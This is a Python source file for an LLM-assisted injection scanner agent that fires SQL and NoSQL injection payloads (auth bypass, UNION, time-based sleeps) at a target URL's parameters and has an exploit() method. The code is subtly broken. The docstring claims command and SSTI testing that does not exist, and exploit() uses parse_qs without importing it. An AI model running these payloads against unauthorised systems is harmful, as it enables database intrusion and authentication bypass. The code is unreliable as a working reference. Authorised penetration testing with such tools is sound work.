"""Injection Attack Agent — SQL, NoSQL, Command, SSTI 💉"""
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient
from briar.core.params import INJECTION as INJECTION_PARAMS

class InjectionAgent:
    """Discovers injection vulnerabilities with real payloads"""

    SQL_PAYLOADS = [
        ("' OR '1'='1", "auth_bypass"),
        ("' OR 1=1--", "auth_bypass"),
        ("' OR '1'='1' --", "auth_bypass"),
        ("' UNION SELECT NULL--", "union"),
        ("' UNION SELECT NULL,NULL--", "union"),
        ("1' AND 1=1--", "boolean_true"),
        ("1' AND 1=2--", "boolean_false"),
        ("' OR SLEEP(3)--", "time_based"),
        ("'; WAITFOR DELAY '00:00:03'--", "time_based"),
        ("' OR pg_sleep(3)--", "time_based"),
        ('{"$gt":""}', "nosql"),
        ("' OR '1'='1' #", "auth_bypass"),
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "Injection"

    def scan(self, url: str, params: list = None, forms: list = None, **kwargs) -> dict:
        """Scan for injection vulnerabilities with real payloads"""
        findings = []
        params = params or INJECTION_PARAMS

        # Get baseline
        try:
            baseline = self.http.get(url, params={params[0]: "normal"})
            baseline_len = len(baseline.text)
            baseline_time = baseline.elapsed.total_seconds()
        except:
            baseline_len = 0
            baseline_time = 0.5

        for param in params[:12]:
            for payload, vuln_type in self.SQL_PAYLOADS:
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue

                    detected = False
                    detection = ""

                    # Error-based detection
                    errors = ["sql", "mysql", "postgresql", "ora-", "syntax error",
                              "unclosed quotation", "microsoft ole db", "odbc driver"]
                    snippet = result.get("text_snippet", "").lower()
                    for e in errors:
                        if e in snippet:
                            detected = True
                            detection = f"error_based ({e})"
                            break

                    # Boolean-based detection
                    if not detected and abs(result["length"] - baseline_len) > 100:
                        detected = True
                        detection = f"boolean_based (len diff: {abs(result['length'] - baseline_len)})"

                    # Time-based detection
                    if not detected and self.http.detect_time_based(result["time"], baseline_time):
                        detected = True
                        detection = f"time_based ({result['time']:.1f}s vs baseline {baseline_time:.1f}s)"

                    if detected:
                        findings.append({
                            "type": f"SQL Injection ({vuln_type})",
                            "severity": "Critical" if vuln_type != "boolean_false" else "High",
                            "param": param,
                            "payload": payload,
                            "detection": detection,
                            "status": result["status"],
                            "length": result["length"],
                            "time": round(result["time"], 2),
                        })
                        break  # Found vuln on this param, next param

                except:
                    pass

        # Build analysis text
        analysis = f"Injection scan complete for {url}\n\n"
        if findings:
            analysis += f"**{len(findings)} potential injection points found:**\n\n"
            for f in findings:
                analysis += f"- **{f['param']}**: {f['type']} — {f['detection']} (payload: `{f['payload']}`)\n"
            analysis += "\n---\n\nLLM analysis of real findings:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET/POST", analysis)
            llm_result["real_findings"] = findings
            llm_result["agent"] = self.name
            llm_result["type"] = "Injection"
            llm_result["severity"] = "Critical" if any(f["severity"] == "Critical" for f in findings) else "High"
            return llm_result
        else:
            analysis += "No injection vulnerabilities detected with automated payloads.\n\nLLM analysis:\n"
            result = self.analyzer.analyze_endpoint(url, "GET/POST", analysis)
            result["real_findings"] = findings
            result["agent"] = self.name
            result["type"] = "Injection"
            result["severity"] = "Info"
            return result

    def exploit(self, url: str, vuln_type: str, payload: str) -> dict:
        """Attempt to exploit an injection vulnerability"""
        from urllib.parse import urlparse, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            result = self.http.send_payload(url, param, payload)
            if "error" not in result and result["status"] == 200:
                return {"url": url, "type": vuln_type, "payload": payload,
                        "status": "exploited", "response_len": result["length"]}
        return {"url": url, "type": vuln_type, "payload": payload, "status": "no_effect"}
